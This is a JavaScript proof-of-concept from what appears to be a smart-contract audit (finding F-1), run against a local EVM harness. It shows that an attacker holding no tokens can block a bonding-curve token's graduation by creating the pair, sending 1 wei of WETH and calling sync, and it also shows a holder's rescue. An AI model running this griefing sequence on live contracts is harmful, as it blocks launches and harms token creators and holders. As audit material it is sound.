// F-1: graduation blocked by 1 wei of WETH alone (no curve tokens needed); and an atomic-style rescue by a holder.
import * as H from './harness.mjs';
const E = 10n ** 18n;
const s = await H.setup();
const CREATOR = '0x' + 'c0'.repeat(20), ATT = '0x' + 'aa'.repeat(20);
await H.fund(CREATOR, 1000n * E); await H.fund(ATT, 1n * E);
let r = await H.call(CREATOR, s.factory, H.facAbi, 'create', ['T', 'T', 18, 1_000_000_000n * E]);
const token = r.out; console.log('token', token);
const total = 1_000_000_000n * E, target = 5n * E;
await H.call(CREATOR, token, H.tokAbi, 'approve', [s.curve, total]);
// creator buys the whole curve (simplest way to reach SoldOut)
r = await H.call(CREATOR, s.curve, H.curveAbi, 'createCurve', [token, 1n, total, target, 0n], 10n * E);
console.log('createCurve+buyout', r.ok, r.reason);
let c = (await H.call(CREATOR, s.curve, H.curveAbi, 'curves', [token])).out; console.log('status', c[0], 'realSol', c[11], 'lp', c[8]);
// attacker: createPair, 1 wei WETH to pair, sync. Holds zero tokens.
r = await H.call(ATT, s.ufac, H.ufacAbi, 'createPair', [token, s.weth]); const pair = r.out; console.log('pair', pair, r.ok);
await H.call(ATT, s.weth, H.wethAbi, 'deposit', [], 1n);
await H.call(ATT, s.weth, H.wethAbi, 'transfer', [pair, 1n]);
r = await H.call(ATT, pair, H.pairAbi, 'sync', []); console.log('sync', r.ok, r.reason);
console.log('attacker token balance', (await H.call(ATT, token, H.tokAbi, 'balanceOf', [ATT])).out);
const snap = await H.vm.stateManager.checkpoint?.bind(H.vm.stateManager);
r = await H.call(ATT, s.curve, H.curveAbi, 'graduate', [token]); console.log('graduate after 1-wei WETH sync:', r.ok, r.reason);
// rescue by a holder: send X tokens so reserves sit at the curve ratio, sync, graduate
const coinIn = c[11], lp = c[8];
const X = lp / coinIn; // token-wei per wei, reserves (X, 1)
await H.call(CREATOR, token, H.tokAbi, 'transfer', [pair, X]);
r = await H.call(CREATOR, pair, H.pairAbi, 'sync', []); console.log('rescue sync', r.ok, 'X=', X);
r = await H.call(ATT, s.curve, H.curveAbi, 'graduate', [token]); console.log('graduate after rescue:', r.ok, r.reason, 'gas', r.gas);
c = (await H.call(CREATOR, s.curve, H.curveAbi, 'curves', [token])).out; console.log('status', c[0]);
const res = (await H.call(ATT, pair, H.pairAbi, 'getReserves', [])).out; console.log('reserves', res[0], res[1]);
console.log('LP at dead', (await H.call(ATT, pair, H.pairAbi, 'balanceOf', ['0x000000000000000000000000000000000000dEaD'])).out);
const bal = await H.vm.stateManager.getAccount(H.addr(s.curve)); console.log('curve ETH left', bal.balance, 'totalOwed', (await H.call(ATT, s.curve, H.curveAbi, 'totalOwed', [])).out);
console.log('curve tokens left', (await H.call(ATT, token, H.tokAbi, 'balanceOf', [s.curve])).out);
